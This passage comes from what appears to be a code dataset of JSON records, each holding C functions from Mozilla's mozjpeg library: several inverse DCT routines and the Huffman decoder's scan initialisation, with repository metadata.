MULTIPLY(z1, FIX(0.676326758)) -        /* c7-c11 */\n             MULTIPLY(z4, FIX(1.982889723));                 /* c5+c7 */\n\n    z1 -= z4;\n    z2 -= z3;\n    z3 = MULTIPLY(z1 + z2, FIX_0_541196100);                 /* c9 */\n    tmp11 = z3 + MULTIPLY(z1, FIX_0_765366865);              /* c3-c9 */\n    tmp14 = z3 - MULTIPLY(z2, FIX_1_847759065);              /* c3+c9 */\n\n    /* Final output stage */\n\n    outptr[0]  = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[11] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[1]  = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[10] = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[2]  = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[9]  = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[3]  = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[8]  = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[4]  = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[7]  = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[5]  = range_limit[(int)RIGHT_SHIFT(tmp25 + tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[6]  = range_limit[(int)RIGHT_SHIFT(tmp25 - tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Initialize for a Huffman-compressed scan.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_huff_decoder(j_decompress_ptr cinfo)", "code": "{\n  huff_entropy_ptr entropy = (huff_entropy_ptr)cinfo->entropy;\n  int ci, blkn, dctbl, actbl;\n  d_derived_tbl **pdtbl;\n  jpeg_component_info *compptr;\n\n  /* Check that the scan parameters Ss, Se, Ah/Al are OK for sequential JPEG.\n   * This ought to be an error condition, but we make it a warning because\n   * there are some baseline files out there with all zeroes in these bytes.\n   */\n  if (cinfo->Ss != 0 || cinfo->Se != DCTSIZE2 - 1 ||\n      cinfo->Ah != 0 || cinfo->Al != 0)\n    WARNMS(cinfo, JWRN_NOT_SEQUENTIAL);\n\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n    compptr = cinfo->cur_comp_info[ci];\n    dctbl = compptr->dc_tbl_no;\n    actbl = compptr->ac_tbl_no;\n    /* Compute derived values for Huffman tables */\n    /* We may do this more than once for a table, but it's not expensive */\n    pdtbl = (d_derived_tbl **)(entropy->dc_derived_tbls) + dctbl;\n    jpeg_make_d_derived_tbl(cinfo, TRUE, dctbl, pdtbl);\n    pdtbl = (d_derived_tbl **)(entropy->ac_derived_tbls) + actbl;\n    jpeg_make_d_derived_tbl(cinfo, FALSE, actbl, pdtbl);\n    /* Initialize DC predictions to 0 */\n    entropy->saved.last_dc_val[ci] = 0;\n  }\n\n  /* Precalculate decoding info for each block in an MCU of this scan */\n  for (blkn = 0; blkn < cinfo->blocks_in_MCU; blkn++) {\n    ci = cinfo->MCU_membership[blkn];\n    compptr = cinfo->cur_comp_info[ci];\n    /* Precalculate which table to use for each block */\n    entropy->dc_cur_tbls[blkn] = entropy->dc_derived_tbls[compptr->dc_tbl_no];\n    entropy->ac_cur_tbls[blkn] = entropy->ac_derived_tbls[compptr->ac_tbl_no];\n    /* Decide whether we really care about the coefficient values */\n    if (compptr->component_needed) {\n      entropy->dc_needed[blkn] = TRUE;\n      /* we don't need the ACs if producing a 1/8th-size image */\n      entropy->ac_needed[blkn] = (compptr->_DCT_scaled_size > 1);\n    } else {\n      entropy->dc_needed[blkn] = entropy->ac_needed[blkn] = FALSE;\n    }\n  }\n\n  /* Initialize bitread state variables */\n  entropy->bitstate.bits_left = 0;\n  entropy->bitstate.get_buffer = 0; /* unnecessary, but keeps Purify quiet */\n  entropy->pub.insufficient_data = FALSE;\n\n  /* Initialize restart counter */\n  entropy->restarts_to_go = cinfo->restart_interval;\n}", "path": "mozjpeg/jdhuff.c", "commit_date": "2019-12-11 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 9x9 output block.\n *\n * Optimized algorithm with 10 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/18).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_9x9(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n              JCOEFPTR coef_block, JSAMPARRAY output_buf,\n              JDIMENSION output_col)", "code": "{\n  JLONG tmp0, tmp1, tmp2, tmp3, tmp10, tmp11, tmp12, tmp13, tmp14;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 9];         /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    tmp0 = LEFT_SHIFT(tmp0, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    tmp0 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    tmp3 = MULTIPLY(z3, FIX(0.707106781));      /* c6 */\n    tmp1 = tmp0 + tmp3;\n    tmp2 = tmp0 - tmp3 - tmp3;\n\n    tmp0 = MULTIPLY(z1 - z2, FIX(0.707106781)); /* c6 */\n    tmp11 = tmp2 + tmp0;\n    tmp14 = tmp2 - tmp0 - tmp0;\n\n    tmp0 = MULTIPLY(z1 + z2, FIX(1.328926049)); /* c2 */\n    tmp2 = MULTIPLY(z1, FIX(1.083350441));      /* c4 */\n    tmp3 = MULTIPLY(z2, FIX(0.245575608));      /* c8 */\n\n    tmp10 = tmp1 + tmp0 - tmp3;\n    tmp12 = tmp1 - tmp0 + tmp2;\n    tmp13 = tmp1 - tmp2 + tmp3;\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    z2 = MULTIPLY(z2, -FIX(1.224744871));            /* -c3 */\n\n    tmp2 = MULTIPLY(z1 + z3, FIX(0.909038955));      /* c5 */\n    tmp3 = MULTIPLY(z1 + z4, FIX(0.483689525));      /* c7 */\n    tmp0 = tmp2 + tmp3 - z2;\n    tmp1 = MULTIPLY(z3 - z4, FIX(1.392728481));      /* c1 */\n    tmp2 += z2 - tmp1;\n    tmp3 += z2 + tmp1;\n    tmp1 = MULTIPLY(z1 - z3 - z4, FIX(1.224744871)); /* c3 */\n\n    /* Final output stage */\n\n    wsptr[8 * 0] = (int)RIGHT_SHIFT(tmp10 + tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8] = (int)RIGHT_SHIFT(tmp10 - tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1] = (int)RIGHT_SHIFT(tmp11 + tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7] = (int)RIGHT_SHIFT(tmp11 - tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2] = (int)RIGHT_SHIFT(tmp12 + tmp2, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6] = (int)RIGHT_SHIFT(tmp12 - tmp2, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3] = (int)RIGHT_SHIFT(tmp13 + tmp3, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5] = (int)RIGHT_SHIFT(tmp13 - tmp3, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4] = (int)RIGHT_SHIFT(tmp14, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 9 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 9; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    tmp0 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    tmp0 = LEFT_SHIFT(tmp0, CONST_BITS);\n\n    z1 = (JLONG)wsptr[2];\n    z2 = (JLONG)wsptr[4];\n    z3 = (JLONG)wsptr[6];\n\n    tmp3 = MULTIPLY(z3, FIX(0.707106781));      /* c6 */\n    tmp1 = tmp0 + tmp3;\n    tmp2 = tmp0 - tmp3 - tmp3;\n\n    tmp0 = MULTIPLY(z1 - z2, FIX(0.707106781)); /* c6 */\n    tmp11 = tmp2 + tmp0;\n    tmp14 = tmp2 - tmp0 - tmp0;\n\n    tmp0 = MULTIPLY(z1 + z2, FIX(1.328926049)); /* c2 */\n    tmp2 = MULTIPLY(z1, FIX(1.083350441));      /* c4 */\n    tmp3 = MULTIPLY(z2, FIX(0.245575608));      /* c8 */\n\n    tmp10 = tmp1 + tmp0 - tmp3;\n    tmp12 = tmp1 - tmp0 + tmp2;\n    tmp13 = tmp1 - tmp2 + tmp3;\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z4 = (JLONG)wsptr[7];\n\n    z2 = MULTIPLY(z2, -FIX(1.224744871));            /* -c3 */\n\n    tmp2 = MULTIPLY(z1 + z3, FIX(0.909038955));      /* c5 */\n    tmp3 = MULTIPLY(z1 + z4, FIX(0.483689525));      /* c7 */\n    tmp0 = tmp2 + tmp3 - z2;\n    tmp1 = MULTIPLY(z3 - z4, FIX(1.392728481));      /* c1 */\n    tmp2 += z2 - tmp1;\n    tmp3 += z2 + tmp1;\n    tmp1 = MULTIPLY(z1 - z3 - z4, FIX(1.224744871)); /* c3 */\n\n    /* Final output stage */\n\n    outptr[0] = range_limit[(int)RIGHT_SHIFT(tmp10 + tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[8] = range_limit[(int)RIGHT_SHIFT(tmp10 - tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[1] = range_limit[(int)RIGHT_SHIFT(tmp11 + tmp1,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[7] = range_limit[(int)RIGHT_SHIFT(tmp11 - tmp1,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[2] = range_limit[(int)RIGHT_SHIFT(tmp12 + tmp2,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[6] = range_limit[(int)RIGHT_SHIFT(tmp12 - tmp2,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[3] = range_limit[(int)RIGHT_SHIFT(tmp13 + tmp3,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[5] = range_limit[(int)RIGHT_SHIFT(tmp13 - tmp3,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[4] = range_limit[(int)RIGHT_SHIFT(tmp14,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_islow(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp0, tmp1, tmp2, tmp3;\n  JLONG tmp10, tmp11, tmp12, tmp13;\n  JLONG z1, z2, z3, z4, z5;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[DCTSIZE2];      /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n  /* Note results are scaled up by sqrt(8) compared to a true IDCT; */\n  /* furthermore, we scale the results by 2**PASS1_BITS. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = DCTSIZE; ctr > 0; ctr--) {\n    /* Due to quantization, we will usually find that many of the input\n     * coefficients are zero, especially the AC terms.  We can exploit this\n     * by short-circuiting the IDCT calculation for any column in which all\n     * the AC terms are zero.  In that case each output is equal to the\n     * DC coefficient (with scale factor as needed).\n     * With typical images and quantization tables, half or more of the\n     * column DCT calculations can be simplified this way.\n     */\n\n    if (inptr[DCTSIZE * 1] == 0 && inptr[DCTSIZE * 2] == 0 &&\n        inptr[DCTSIZE * 3] == 0 && inptr[DCTSIZE * 4] == 0 &&\n        inptr[DCTSIZE * 5] == 0 && inptr[DCTSIZE * 6] == 0 &&\n        inptr[DCTSIZE * 7] == 0) {\n      /* AC terms all zero */\n      int dcval = LEFT_SHIFT(DEQUANTIZE(inptr[DCTSIZE * 0],\n                             quantptr[DCTSIZE * 0]), PASS1_BITS);\n\n      wsptr[DCTSIZE * 0] = dcval;\n      wsptr[DCTSIZE * 1] = dcval;\n      wsptr[DCTSIZE * 2] = dcval;\n      wsptr[DCTSIZE * 3] = dcval;\n      wsptr[DCTSIZE * 4] = dcval;\n      wsptr[DCTSIZE * 5] = dcval;\n      wsptr[DCTSIZE * 6] = dcval;\n      wsptr[DCTSIZE * 7] = dcval;\n\n      inptr++;                  /* advance pointers to next column */\n      quantptr++;\n      wsptr++;\n      continue;\n    }\n\n    /* Even part: reverse the even part of the forward DCT. */\n    /* The rotator is sqrt(2)*c(-6). */\n\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    z1 = MULTIPLY(z2 + z3, FIX_0_541196100);\n    tmp2 = z1 + MULTIPLY(z3, -FIX_1_847759065);\n    tmp3 = z1 + MULTIPLY(z2, FIX_0_765366865);\n\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n\n    tmp0 = LEFT_SHIFT(z2 + z3, CONST_BITS);\n    tmp1 = LEFT_SHIFT(z2 - z3, CONST_BITS);\n\n    tmp10 = tmp0 + tmp3;\n    tmp13 = tmp0 - tmp3;\n    tmp11 = tmp1 + tmp2;\n    tmp12 = tmp1 - tmp2;\n\n    /* Odd part per figure 8; the matrix is unitary and hence its\n     * transpose is its inverse.  i0..i3 are y7,y5,y3,y1 respectively.\n     */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n    tmp1 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    tmp2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    tmp3 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n\n    z1 = tmp0 + tmp3;\n    z2 = tmp1 + tmp2;\n    z3 = tmp0 + tmp2;\n    z4 = tmp1 + tmp3;\n    z5 = MULTIPLY(z3 + z4, FIX_1_175875602); /* sqrt(2) * c3 */\n\n    tmp0 = MULTIPLY(tmp0, FIX_0_298631336); /* sqrt(2) * (-c1+c3+c5-c7) */\n    tmp1 = MULTIPLY(tmp1, FIX_2_053119869); /* sqrt(2) * ( c1+c3-c5+c7) */\n    tmp2 = MULTIPLY(tmp2, FIX_3_072711026); /* sqrt(2) * ( c1+c3+c5-c7) */\n    tmp3 = MULTIPLY(tmp3, FIX_1_501321110); /* sqrt(2) * ( c1+c3-c5-c7) */\n    z1 = MULTIPLY(z1, -FIX_0_899976223); /* sqrt(2) * ( c7-c3) */\n    z2 = MULTIPLY(z2, -FIX_2_562915447); /* sqrt(2) * (-c1-c3) */\n    z3 = MULTIPLY(z3, -FIX_1_961570560); /* sqrt(2) * (-c3-c5) */\n    z4 = MULTIPLY(z4, -FIX_0_390180644); /* sqrt(2) * ( c5-c3) */\n\n    z3 += z5;\n    z4 += z5;\n\n    tmp0 += z1 + z3;\n    tmp1 += z2 + z4;\n    tmp2 += z2 + z3;\n    tmp3 += z1 + z4;\n\n    /* Final output stage: inputs are tmp10..tmp13, tmp0..tmp3 */\n\n    wsptr[DCTSIZE * 0] = (int)DESCALE(tmp10 + tmp3, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 7] = (int)DESCALE(tmp10 - tmp3, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 1] = (int)DESCALE(tmp11 + tmp2, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 6] = (int)DESCALE(tmp11 - tmp2, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 2] = (int)DESCALE(tmp12 + tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 5] = (int)DESCALE(tmp12 - tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 3] = (int)DESCALE(tmp13 + tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[DCTSIZE * 4] = (int)DESCALE(tmp13 - tmp0, CONST_BITS - PASS1_BITS);\n\n    inptr++;                    /* advance pointers to next column */\n    quantptr++;\n    wsptr++;\n  }\n\n  /* Pass 2: process rows from work array, store into output array. */\n  /* Note that we must descale the results by a factor of 8 == 2**3, */\n  /* and also undo the PASS1_BITS scaling. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < DCTSIZE; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n    /* Rows of zeroes can be exploited in the same way as we did with columns.\n     * However, the column calculation has created many nonzero AC terms, so\n     * the simplification applies less often (typically 5% to 10% of the time).\n     * On machines with very fast multiplication, it's possible that the\n     * test takes more time than it's worth.  In that case this section\n     * may be commented out.\n     */\n\n#ifndef NO_ZERO_ROW_TEST\n    if (wsptr[1] == 0 && wsptr[2] == 0 && wsptr[3] == 0 && wsptr[4] == 0 &&\n        wsptr[5] == 0 && wsptr[6] == 0 && wsptr[7] == 0) {\n      /* AC terms all zero */\n      JSAMPLE dcval = range_limit[(int)DESCALE((JLONG)wsptr[0],\n                                               PASS1_BITS + 3) & RANGE_MASK];\n\n      outptr[0] = dcval;\n      outptr[1] = dcval;\n      outptr[2] = dcval;\n      outptr[3] = dcval;\n      outptr[4] = dcval;\n      outptr[5] = dcval;\n      outptr[6] = dcval;\n      outptr[7] = dcval;\n\n      wsptr += DCTSIZE;         /* advance pointer to next row */\n      continue;\n    }\n#endif\n\n    /* Even part: reverse the even part of the forward DCT. */\n    /* The rotator is sqrt(2)*c(-6). */\n\n    z2 = (JLONG)wsptr[2];\n    z3 = (JLONG)wsptr[6];\n\n    z1 = MULTIPLY(z2 + z3, FIX_0_541196100);\n    tmp2 = z1 + MULTIPLY(z3, -FIX_1_847759065);\n    tmp3 = z1 + MULTIPLY(z2, FIX_0_765366865);\n\n    tmp0 = LEFT_SHIFT((JLONG)wsptr[0] + (JLONG)wsptr[4], CONST_BITS);\n    tmp1 = LEFT_SHIFT((JLONG)wsptr[0] - (JLONG)wsptr[4], CONST_BITS);\n\n    tmp10 = tmp0 + tmp3;\n    tmp13 = tmp0 - tmp3;\n    tmp11 = tmp1 + tmp2;\n    tmp12 = tmp1 - tmp2;\n\n    /* Odd part per figure 8; the matrix is unitary and hence its\n     * transpose is its inverse.  i0..i3 are y7,y5,y3,y1 respectively.\n     */\n\n    tmp0 = (JLONG)wsptr[7];\n    tmp1 = (JLONG)wsptr[5];\n    tmp2 = (JLONG)wsptr[3];\n    tmp3 = (JLONG)wsptr[1];\n\n    z1 = tmp0 + tmp3;\n    z2 = tmp1 + tmp2;\n    z3 = tmp0 + tmp2;\n    z4 = tmp1 + tmp3;\n    z5 = MULTIPLY(z3 + z4, FIX_1_175875602); /* sqrt(2) * c3 */\n\n    tmp0 = MULTIPLY(tmp0, FIX_0_298631336); /* sqrt(2) * (-c1+c3+c5-c7) */\n    tmp1 = MULTIPLY(tmp1, FIX_2_053119869); /* sqrt(2) * ( c1+c3-c5+c7) */\n    tmp2 = MULTIPLY(tmp2, FIX_3_072711026); /* sqrt(2) * ( c1+c3+c5-c7) */\n    tmp3 = MULTIPLY(tmp3, FIX_1_501321110); /* sqrt(2) * ( c1+c3-c5-c7) */\n    z1 = MULTIPLY(z1, -FIX_0_899976223); /* sqrt(2) * ( c7-c3) */\n    z2 = MULTIPLY(z2, -FIX_2_562915447); /* sqrt(2) * (-c1-c3) */\n    z3 = MULTIPLY(z3, -FIX_1_961570560); /* sqrt(2) * (-c3-c5) */\n    z4 = MULTIPLY(z4, -FIX_0_390180644); /* sqrt(2) * ( c5-c3) */\n\n    z3 += z5;\n    z4 += z5;\n\n    tmp0 += z1 + z3;\n    tmp1 += z2 + z4;\n    tmp2 += z2 + z3;\n    tmp3 += z1 + z4;\n\n    /* Final output stage: inputs are tmp10..tmp13, tmp0..tmp3 */\n\n    outptr[0] = range_limit[(int)DESCALE(tmp10 + tmp3,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[7] = range_limit[(int)DESCALE(tmp10 - tmp3,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[1] = range_limit[(int)DESCALE(tmp11 + tmp2,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[6] = range_limit[(int)DESCALE(tmp11 - tmp2,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[2] = range_limit[(int)DESCALE(tmp12 + tmp1,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[5] = range_limit[(int)DESCALE(tmp12 - tmp1,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[3] = range_limit[(int)DESCALE(tmp13 + tmp0,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[4] = range_limit[(int)DESCALE(tmp13 - tmp0,\n                                         CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n\n    wsptr += DCTSIZE;           /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 10x10 output block.\n *\n * Optimized algorithm with 12 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/20).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_10x10(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp10, tmp11, tmp12, tmp13, tmp14;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24;\n  JLONG z1, z2, z3, z4, z5;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 10];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    z3 = LEFT_SHIFT(z3, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    z3 += ONE << (CONST_BITS - PASS1_BITS - 1);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z1 = MULTIPLY(z4, FIX(1.144122806));         /* c4 */\n    z2 = MULTIPLY(z4, FIX(0.437016024));         /* c8 */\n    tmp10 = z3 + z1;\n    tmp11 = z3 - z2;\n\n    tmp22 = RIGHT_SHIFT(z3 - LEFT_SHIFT(z1 - z2, 1),\n                        CONST_BITS - PASS1_BITS); /* c0 = (c4-c8)*2 */\n\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    z1 = MULTIPLY(z2 + z3, FIX(0.831253876));    /* c6 */\n    tmp12 = z1 + MULTIPLY(z2, FIX(0.513743148)); /* c2-c6 */\n    tmp13 = z1 - MULTIPLY(z3, FIX(2.176250899)); /* c2+c6 */\n\n    tmp20 = tmp10 + tmp12;\n    tmp24 = tmp10 - tmp12;\n    tmp21 = tmp11 + tmp13;\n    tmp23 = tmp11 - tmp13;\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    tmp11 = z2 + z4;\n    tmp13 = z2 - z4;\n\n    tmp12 = MULTIPLY(tmp13, FIX(0.309016994));        /* (c3-c7)/2 */\n    z5 = LEFT_SHIFT(z3, CONST_BITS);\n\n    z2 = MULTIPLY(tmp11, FIX(0.951056516));           /* (c3+c7)/2 */\n    z4 = z5 + tmp12;\n\n    tmp10 = MULTIPLY(z1, FIX(1.396802247)) + z2 + z4; /* c1 */\n    tmp14 = MULTIPLY(z1, FIX(0.221231742)) - z2 + z4; /* c9 */\n\n    z2 = MULTIPLY(tmp11, FIX(0.587785252));           /* (c1-c9)/2 */\n    z4 = z5 - tmp12 - LEFT_SHIFT(tmp13, CONST_BITS - 1);\n\n    tmp12 = LEFT_SHIFT(z1 - tmp13 - z3, PASS1_BITS);\n\n    tmp11 = MULTIPLY(z1, FIX(1.260073511)) - z2 - z4; /* c3 */\n    tmp13 = MULTIPLY(z1, FIX(0.642039522)) - z2 + z4; /* c7 */\n\n    /* Final output stage */\n\n    wsptr[8 * 0] = (int)RIGHT_SHIFT(tmp20 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9] = (int)RIGHT_SHIFT(tmp20 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1] = (int)RIGHT_SHIFT(tmp21 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8] = (int)RIGHT_SHIFT(tmp21 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2] = (int)(tmp22 + tmp12);\n    wsptr[8 * 7] = (int)(tmp22 - tmp12);\n    wsptr[8 * 3] = (int)RIGHT_SHIFT(tmp23 + tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6] = (int)RIGHT_SHIFT(tmp23 - tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4] = (int)RIGHT_SHIFT(tmp24 + tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5] = (int)RIGHT_SHIFT(tmp24 - tmp14, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 10 rows from work array, store into output array. 